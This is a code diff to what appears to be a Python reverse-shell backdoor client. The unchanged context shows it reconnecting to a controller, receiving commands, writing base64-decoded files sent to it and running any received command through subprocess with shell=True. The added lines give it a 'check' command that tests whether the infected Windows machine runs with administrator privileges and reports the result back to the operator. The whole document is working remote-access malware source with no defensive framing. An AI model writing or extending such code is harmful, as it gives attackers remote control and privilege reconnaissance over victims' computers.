@@ -45,6 +45,15 @@ def connection():
         except:
             connection()
 
+def admin_privilege():
+    global admin
+    try:
+        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
+    except:
+        admin = "[!!] User Privileges"
+    else:
+        admin = "[+] Administrator Privileges"
+
 def shell():
     while True:
         command = reliable_recv()
@@ -89,6 +98,12 @@ def shell():
                 result = reliable_recv()
                 fin.write(base64.b64decode(result))
             continue
+        elif command[:5] == 'check':
+            try:
+                admin_privilege()
+                reliable_send(admin)
+            except:
+                reliable_send('Can\'t Perform The Check')
         else:
             try:
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
